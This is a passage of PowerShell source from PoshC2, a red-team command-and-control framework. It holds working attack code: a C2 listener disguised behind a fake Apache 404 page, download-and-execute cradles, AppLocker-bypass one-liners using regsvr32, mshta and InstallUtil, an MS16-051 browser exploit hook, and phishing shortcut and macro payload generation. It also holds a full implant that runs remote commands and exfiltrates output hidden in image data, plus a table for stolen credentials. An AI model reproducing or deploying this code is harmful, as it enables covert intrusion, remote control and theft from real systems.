    $ipv4address = "http://"+$ipv4address
        $defaultserverport = 80
    }
    
    $apache = @"
RewriteEngine On
RewriteRule ^/webapp/static(.*) $uri<IP ADDRESS>/webapp/static`$1 [NC,P]
RewriteRule ^/connect(.*) $uri<IP ADDRESS>/connect`$1 [NC,P]
RewriteRule ^/daisy(.*) $uri<IP ADDRESS>/daisy`$1 [NC,P]
"@
    $customurldef = "No"
    $customurl = Read-Host -Prompt "[3] Do you want to customize the beacon URLs from the default? [No]"
    $customurl = ($customurldef,$customurl)[[bool]$customurl]
    if ($customurl -eq "Yes") {
        $urls = @()
        do {
            $input = (Read-Host "Please enter the URLs you want to use, enter blank entry to finish: images/site/content")
            if ($input -ne '') {$urls += "`"$input`""; $apache += "`nRewriteRule ^/$input(.*) http://<IP ADDRESS>/$input`$1 [NC,P]"}
        }
        until ($input -eq '')
        [string]$urlstring = $null
        $urlstring = $urls -join ","
    } else {
        $urlstring = '"images/static/content/","news/id=","webapp/static/","images/prints/","wordpress/site/","steam/","true/images/77/static/","holdings/office/images/"'
            $apache = @"
RewriteEngine On
RewriteRule ^/connect(.*) $uri<IP ADDRESS>/connect`$1 [NC,P]
RewriteRule ^/daisy(.*) $uri<IP ADDRESS>/daisy`$1 [NC,P]
RewriteRule ^/images/static/content/(.*) $uri<IP ADDRESS>/images/static/content/`$1 [NC,P]
RewriteRule ^/news/(.*) $uri<IP ADDRESS>/news/`$1 [NC,P]
RewriteRule ^/webapp/static/(.*) $uri<IP ADDRESS>/webapp/static/`$1 [NC,P]
RewriteRule ^/images/prints/(.*) $uri<IP ADDRESS>/images/prints/`$1 [NC,P]
RewriteRule ^/wordpress/site/(.*) $uri<IP ADDRESS>/wordpress/site/`$1 [NC,P]
RewriteRule ^/true/images/77/(.*) $uri<IP ADDRESS>/true/images/77/`$1 [NC,P]
RewriteRule ^/holdings/office/images/(.*) $uri<IP ADDRESS>/holdings/office/images/`$1 [NC,P]
RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
"@
    }

    $global:newdir = 'PoshC2-'+(get-date -Format yyy-dd-MM-HHmm)
    $prompt = Read-Host -Prompt "[4] Enter a new folder name for this project [$($global:newdir)]"
    $tempdir= ($global:newdir,$prompt)[[bool]$prompt]
    $RootFolder = $PoshPath.TrimEnd("PowershellC2\")
    $global:newdir = $RootFolder+"\"+$tempdir

    $defbeacontime = "5s"
    $prompt = Read-Host -Prompt "[5] Enter the default beacon time of the Posh C2 Server - 30s, 5m, 1h (10% jitter is always applied) [$($defbeacontime)]"
    $defaultbeacon = ($defbeacontime,$prompt)[[bool]$prompt]
    if ($defaultbeacon.ToLower().Contains('m')) { 
        $defaultbeacon = $defaultbeacon -replace 'm', ''
        [int]$newsleep = $defaultbeacon 
        [int]$defaultbeacon = $newsleep * 60
    }
    elseif ($defaultbeacon.ToLower().Contains('h')) { 
        $defaultbeacon = $defaultbeacon -replace 'h', ''
        [int]$newsleep1 = $defaultbeacon 
        [int]$newsleep2 = $newsleep1 * 60
        [int]$defaultbeacon = $newsleep2 * 60
    }
    elseif ($defaultbeacon.ToLower().Contains('s')) { 
        $defaultbeacon = $defaultbeacon -replace 's', ''
    } else {
        $defaultbeacon = $defaultbeacon
    }

    $killdatedefault = (get-date).AddDays(14)
    $killdatedefault = (get-date -date $killdatedefault -Format "dd/MM/yyyy")
    $prompt = Read-Host -Prompt "[6] Enter the auto Kill Date of the implants in this format dd/MM/yyyy [$($killdatedefault)]"
    $killdate = ($killdatedefault,$prompt)[[bool]$prompt]
    $killdate = [datetime]::ParseExact($killdate,"dd/MM/yyyy",$null)
    $killdatefm = Get-Date -Date $killdate -Format "dd/MM/yyyy"

    $prompt = Read-Host -Prompt "[7] Enter the HTTP port you want to use, 80/443 is highly preferable for proxying [$($defaultserverport)]"
    $serverport = ($defaultserverport,$prompt)[[bool]$prompt]

    $enablesound = "Yes"
    $prompt = Read-Host -Prompt "[8] Do you want to enable sound? [$($enablesound)]"
    $enablesound = ($enablesound,$prompt)[[bool]$prompt]
    
    $downloaduri = Get-RandomURI -Length 5
    if ($ipv4address.Contains("https")) {
        $shortcut = "powershell -exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+"" 
    } else {
        $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+""     
    }

    $httpresponse = '
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache (Debian) Server</address>
</body></html>
    '
    New-Item $global:newdir -Type directory | Out-Null
    New-Item $global:newdir\downloads -Type directory | Out-Null
    New-Item $global:newdir\reports -Type directory | Out-Null
    New-Item $global:newdir\payloads -Type directory | Out-Null
    $Database = "$global:newdir\PowershellC2.SQLite"

    $Query = 'CREATE TABLE Implants (
        ImplantID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        RandomURI VARCHAR(20),
        User TEXT,
        Hostname TEXT,
        IpAddress TEXT,
        Key TEXT,
        FirstSeen TEXT,
        LastSeen TEXT,
        PID TEXT,
        Arch TEXT,
        Domain TEXT,
        Alive TEXT,
        Sleep TEXT,
        ModsLoaded TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

	$Query = 'CREATE TABLE AutoRuns (
        TaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        Task TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE CompletedTasks (
        CompletedTaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        TaskID TEXT,
        RandomURI TEXT,
        Command TEXT,
        Output TEXT,
        Prompt TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE NewTasks (
        TaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        RandomURI TEXT,
        Command TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE Creds (
        credsID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        Username TEXT,
        Password TEXT,
        Hash TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE C2Server (
        ID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        HostnameIP TEXT,
        DomainFrontHeader TEXT,
        DefaultSleep TEXT,
        KillDate TEXT,
        HTTPResponse TEXT,
        FolderPath TEXT,
        ServerPort TEXT,
        QuickCommand TEXT,
        DownloadURI TEXT,
        ProxyURL TEXT,
        ProxyUser TEXT,
        ProxyPass TEXT,
        Sounds TEXT,
        URLS TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE History (
        ID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        Command TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, URLS)
            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @URLS)'

    Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
        DefaultSleep = $defaultbeacon
        KillDate = $killdatefm
        HostnameIP  = $ipv4address
        DomainFrontHeader  = $domainfrontheader
        HTTPResponse = $httpresponse
        FolderPath = $global:newdir
        ServerPort = $serverport
        QuickCommand = $shortcut
        DownloadURI = $downloaduri
        Sounds = $enablesound
        URLS = $urlstring
    } | Out-Null

    Write-Host `n"Apache rewrite rules written to: $global:newdir\apache.conf" -ForegroundColor Green
    Out-File -InputObject $apache -Encoding ascii -FilePath "$global:newdir\apache.conf"
        
    Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill Date $killdatefm"`n -ForegroundColor Green
    Write-Host "To quickly get setup for internal pentesting, run:"

    write-host $shortcut `n -ForegroundColor green
    Write-Host "For a more stealthy approach, use SubTee's exploits:"
    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg`")(window.close)" -ForegroundColor green
    write-host ""
    Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
    write-host ""
    Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
    write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
    write-host ""
    # call back command
    $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
function Get-Webclient ($Cookie) {
$d = (Get-Date -Format "dd/MM/yyyy");
$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
if ($k -lt $d) {exit} 
$wc = New-Object System.Net.WebClient; 
$wc.UseDefaultCredentials = $true; 
$wc.Proxy.Credentials = $wc.Credentials;
$h="'+$domainfrontheader+'"
if ($h) {$wc.Headers.Add("Host",$h)}
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
if ($cookie) {
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
} $wc }
function primer {
if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
$p64 = [Convert]::ToBase64String($pre)
$pm = (Get-Webclient).downloadstring("'+$ipv4address+":"+$serverport+'/connect?$p64")
$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm)) 
$pm } 
$pm = primer
if ($pm) {$pm| iex} else {
start-sleep 10
primer | iex }'
    Write-Host -Object "For " -NoNewline
    Write-Host -Object "Red Teaming " -NoNewline -ForegroundColor Red
    Write-Host -Object "activities, use the following payloads:" 
    # create payloads
    if ($JDKPath){
        CreateJavaPayload
    } else {
        write-host "Java JDK installer was not found, as a result it cannot create .jar file: "$JDKPath
    }
    # create other payloads

    CreatePayload
    CreateHTAPayload
    CreateMacroPayload
    Create-MS16-051-Payload
    CreateStandAloneExe
    CreateServiceExe
    
    Start-Sleep 3
    $t = IEX "$PoshPath\DotNetToJS\DotNetToJScript.exe -c Program -o `"$global:newdir\payloads\posh.js`" `"$global:newdir\payloads\posh.exe`""|Out-Null
    Write-Host -Object "DotNetToJS Created .js Payload written to: $global:newdir\payloads\posh.js"  -ForegroundColor Green
    
    Write-Host -Object "Phishing .lnk Payload written to: $global:newdir\payloads\PhishingAttack-Link.lnk"  -ForegroundColor Green

    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""

    
    #launch a new powershell session with the implant handler running
    Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"
    Write-Host `n"To re-open the Implant-Handler or C2Server, use the following shortcuts in this directory: "
    Write-Host "$global:newdir" `n  -ForegroundColor Green
    $SourceExe = "powershell.exe"
    $ArgumentsToSourceExe = "-exec bypass -c import-module ${PoshPath}C2-Server.ps1;C2-Server -RestartC2Server '$global:newdir' -PoshPath '$PoshPath'"
    $DestinationPath = "$global:newdir\Restart-C2Server.lnk"
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($DestinationPath)
    $Shortcut.TargetPath = $SourceExe
    $Shortcut.Arguments = $ArgumentsToSourceExe
    $Shortcut.Save()
    # add run as administrator 
    $bytes = [System.IO.File]::ReadAllBytes("$global:newdir\Restart-C2Server.lnk")
    $bytes[0x15] = $bytes[0x15] -bor 0x20
    [System.IO.File]::WriteAllBytes("$global:newdir\Restart-C2Server.lnk", $bytes)

    $SourceExe = "powershell.exe"
    $ArgumentsToSourceExe = "-exec bypass -c import-module ${PoshPath}Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"
    $DestinationPath = "$global:newdir\Restart-Implant-Handler.lnk"
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($DestinationPath)
    $Shortcut.TargetPath = $SourceExe
    $Shortcut.Arguments = $ArgumentsToSourceExe
    $Shortcut.Save()

    $SourceExe = "powershell.exe"
    $ArgumentsToSourceExe = "-exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+"" 
    $DestinationPath = "$global:newdir\payloads\PhishingAttack-Link.lnk"
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($DestinationPath)
    $Shortcut.TargetPath = $SourceExe
    $Shortcut.Arguments = $ArgumentsToSourceExe
    $Shortcut.WindowStyle = 7
    $Shortcut.Save()
}

# add as many images to the images directory as long as the images are less than 1500 bytes in size
$imageArray = @()
$imageFilesUsed = @()
$imageFiles = Get-ChildItem "$PoshPath\Images" | select FullName
$count = 0 

while ($count -lt 5) {

    $randomImage =  $imageFiles | Get-Random 
    $randomImage = $randomImage.FullName
    if (-not ($imageFilesUsed -contains $randomImage)){

        $imageBytes = Get-Content $randomImage -Encoding Byte

        if ($imageBytes.Length -lt 1495) {
            $imageFilesUsed += $randomImage
            $imageBytes = Get-Content $randomImage -Encoding Byte
            $imageArray += [Convert]::ToBase64String($imageBytes)
            $count = $count + 1
        }
    }
}

# C2 server component
$listener = New-Object -TypeName System.Net.HttpListener 

if ($ipv4address.Contains("https")) {
    $listener.Prefixes.Add("https://+:$serverport/") 
} else {
    $listener.Prefixes.Add("http://+:$serverport/") 
}
$readhost = 'PS >'
$listener.Start()

# while the HTTP server is listening do the grunt of the work
while ($listener.IsListening) 
{
    $message = $null
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response       
    if ($request.Url -match "/webapp/static/$($downloaduri)$") 
    {
        $message = $payload
    }
    if ($request.Url -match "/webapp/static/$($downloaduri)_ms16-051$")
    {
        $message = Get-Content -Path $global:newdir/payloads/ms16-051.html
    }
    if ($request.Url -match "/webapp/static/$($downloaduri)_rg$") 
    {

        $payloadparams = $payload -replace "powershell.exe ",""
        $message = '<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    >   
    <script language="VBScript">
        <![CDATA[
            Sub Exec()
            Dim objShell
            set objShell = CreateObject("shell.application")
            objShell.ShellExecute "powershell.exe", "'+$payloadparams+'", "", "open", 0
            End Sub
            Exec()
        ]]>
    </script>
</registration>
<public>
    <method name="Exec"></method>
</public>
<script language="VBScript">
    <![CDATA[
        Sub Exec()
        Dim objShell
        set objShell = CreateObject("shell.application")
        objShell.ShellExecute "powershell.exe", "'+$payloadparams+'", "", "open", 0
        End Sub
        Exec()
    ]]>
</script>

</scriptlet>'
    }
    if ($request.Url -match "/webapp/static/$($downloaduri)_cs$") 
    {
        $dotnettojs = gc $global:newdir\payloads\posh.js | Out-String
        $message = '<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
	>
</registration>

<script language="JScript">
<![CDATA[
'+$dotnettojs+'	
]]>
</script>

</scriptlet>'
    }
    if (($request.Url -match '/daisy') -and (($request.Cookies[0]).Name -match 'SessionID'))
    {
        # generate randon uri
        $randomuri = Get-RandomURI -Length 15
        $randomuriarray += $randomuri

        # create new key for each implant comms
        $key = Create-AesKey
        $endpointip = $request.RemoteEndPoint
        $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(($request.Cookies[0]).Value))
        $im_domain,$im_username,$im_computername,$im_arch,$im_pid = $cookieplaintext.split(";",5)

        ## add anti-ir and implant safety mechanisms here!
        #
        # if ($im_domain -ne "blorebank") { do something }
        # if ($im_domain -ne "safenet") { do something }
        #
        ## add anti-ir and implant safety mechanisms here!

        Write-Host "New Daisy chain implant connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
        Write-Host "$endpointip | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green

        if ($enablesound -eq "Yes") {
            try {
            $voice = New-Object -com SAPI.SpVoice                        
            $voice.rate = -2                        
            $voice.Speak("Nice, we have a daisy chain implant")|Out-Null
            } catch {}
        }

        $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Arch, Domain, Alive, Sleep, ModsLoaded)
        VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded)'

        Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
            RandomURI = $randomuri
            User      = $im_username
            Hostname  = $im_computername
            IpAddress = $request.RemoteEndPoint
            Key       = $key
            FirstSeen = "$(Get-Date)"
            LastSeen  = "$(Get-Date)"
            PID  = $im_pid
            Arch = $im_arch
            Domain = $im_domain
            Alive = "Yes"
            Sleep = $defaultbeacon
            ModsLoaded = ""
        }

	    $autorunresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject        
 
        if ($autorunresults -ne $null){
			Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET ModsLoaded='implant-core.ps1' WHERE RandomURI='$randomuri'"|Out-Null
			$query = "INSERT INTO NewTasks (RandomURI, Command)
			VALUES (@RandomURI, @Command)"
			
			Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
			RandomURI = $randomuri
			Command   = "LoadModule implant-core.ps1"
			} | Out-Null
			
            foreach ($i in $autorunresults) {
                $taskee = $i.Task
                			
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
			    RandomURI = $randomuri
			    Command   = $taskee
                } | Out-Null
			
            }
		}

        $message = '

$key="' + "$key"+'"
$sleeptime = '+$defaultbeacon+'
$payload = "' + "$payload"+'"

function getimgdata($cmdoutput) {
    $icoimage = "'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'"`,"'+$imageArray[2]+'","'+$imageArray[3]+'"
    $image = $icoimage|get-random

    function randomgen 
    {
        param (
            [int]$Length
        )
        $set = "...................@..........................Tyscf".ToCharArray()
        $result = ""
        for ($x = 0; $x -lt $Length; $x++) 
        {$result += $set | Get-Random}
        return $result
    }
    $imageBytes = [Convert]::FromBase64String($image)
    $maxbyteslen = 1500
    $imagebyteslen = $imageBytes.Length
    $paddingbyteslen = $maxbyteslen - $imagebyteslen

    $BytePadding = [system.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
    $ImagePlusPad = New-Object byte[] $maxbyteslen
    $ImagePlusPadBytes = ($imageBytes+$BytePadding)
    $CombinedBytes = $ImagePlusPadBytes.length

    $CmdBytes = $cmdoutput
    $CmdBytesLen = $CmdBytes.Length

    $CombinedByteSize = $CmdBytesLen + $CombinedBytes
    $FullBuffer = New-Object byte[] $CombinedByteSize

    $FullBuffer = ($ImagePlusPadBytes+$CmdBytes)
    $FullBufferSize = $FullBuffer.length
    return $FullBuffer
}

function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
    if ($IV.getType().Name -eq "String") {
    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
    }
    else {
    $aesManaged.IV = $IV
    }
    }
    if ($key) {
    if ($key.getType().Name -eq "String") {
    $aesManaged.Key = [System.Convert]::FromBase64String($key)
    }
    else {
    $aesManaged.Key = $key
    }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    #$aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    #$aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
function Encrypt-String2($key, $unencryptedString) {
    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
    $DeflateStream.Dispose()
    $bytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}
function Decrypt-String2($key, $encryptedStringWithIV) {
    $bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
    $output
    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$URI= "'+$randomuri+'"
$Server = "$server/'+$randomuri+'"
$ServerClean = $Server
while($true)
{
    $date = (Get-Date -Format "dd/MM/yyyy")
    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
    $killdate = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null)
    if ($killdate -lt $date) {exit}
    $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
    $newsleep = $sleeptimeran|get-random
    if ($newsleep -lt 1) {$newsleep = 5} 
    start-sleep $newsleep
    $URLS = '+$urlstring+'
    $RandomURI = Get-Random $URLS
    $Server = "$ServerClean/$RandomURI$URI"
    $ReadCommand = (Get-Webclient).DownloadString("$Server")

     while($ReadCommand) {
        $ReadCommandClear = Decrypt-String $key $ReadCommand
        $error.clear()
        if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
            if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
                    $splitcmd = $ReadCommandClear -replace "multicmd",""
                    $split = $splitcmd -split "!d-3dion@LD!-d"
                    foreach ($i in $split){
                        $error.clear()
                        if  ($i.ToLower().StartsWith("upload-file")) {
                            try {
                                $Output = Invoke-Expression $i | out-string
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                                $ModuleLoaded = Encrypt-String $key $result
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorUpload: " + $error[0]
                            }
                        } elseif  ($i.ToLower().StartsWith("loadmodule")) {
                            try {
                                $modulename = $i -replace "LoadModule",""
                                $Output = Invoke-Expression $modulename | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorLoadMod: " + $error[0]
                            }
                        } else {
                            try {
                                $Output = Invoke-Expression $i | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $StdError = ($error[0] | Out-String)
                                if ($StdError){
                                $Output = $Output + $StdError
                                $error.clear()
                                }
                            } catch {
                                $Output = "ErrorCmd: " + $error[0]
                            }
                            $Output = Encrypt-String2 $key $Output
                            $Response = Encrypt-String $key $i
                            $UploadBytes = getimgdata $Output
                            (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
                        }
                    } 
            }
            elseif  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
                try {
                $Output = Invoke-Expression $ReadCommandClear | out-string
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                $ModuleLoaded = Encrypt-String $key $result
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorUpload: " + $error[0]
                }

            } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
                try {
                $modulename = $ReadCommandClear -replace "LoadModule",""
                $Output = Invoke-Expression $modulename | out-string  
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorLoadMod: " + $error[0]
                }

            } else {
                try {
                    $Output = Invoke-Expression $ReadCommandClear | out-string  
                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                    $StdError = ($error[0] | Out-String)
                    if ($StdError){
                    $Output = $Output + $StdError
                    $error.clear()
                    }
                } catch {
                    $Output = "ErrorCmd: " + $error[0]
                }

            $Output = Encrypt-String2 $key $Output
            $UploadBytes = getimgdata $Output
            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null

            }
        }
    break
    }
}'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
$message =[Convert]::ToBase64String($Bytes)

    }
    if (($request.Url -match '/connect'))
    {
        # generate randon uri
        $randomuri = Get-RandomURI -Length 15
        $randomuriarray += $randomuri

        # create new key for each implant comms
        $key = Create-AesKey
        $endpointip = $request.RemoteEndPoint

        $urlstrip = ($request.Url) -split "[?]"
        $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($urlstrip[1]))

        $im_domain,$im_username,$im_computername,$im_arch,$im_pid = $cookieplaintext.split(";",5)

        ## add anti-ir and implant safety mechanisms here!
        #
        # if ($im_domain -ne "blorebank") { do something }
        # if ($im_domain -ne "safenet") { do something }
        #
        ## add anti-ir and implant safety mechanisms here!

        Write-Host "New host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
        Write-Host "$endpointip | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green

        # optional clockwork sms on new implant
        $mobilenumber = ""
        $apikey = ""
        if (($apikey) -and ($mobilenumber)){
            (New-Object System.Net.Webclient).DownloadString("https://api.clockworksms.com/http/send.aspx?key=$apikey&to=$mobilenumber&from=PoshC2&content=$im_computername")|Out-Null
        }

        if ($enablesound -eq "Yes") {
            try {
            $voice = New-Object -com SAPI.SpVoice                        
            $voice.rate = -2                        
            $voice.Speak("Nice, we have an implant")|Out-Null
            } catch {}
        }

        $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Arch, Domain, Alive, Sleep, ModsLoaded)
        VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded)'

        Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
            RandomURI = $randomuri
            User      = $im_username
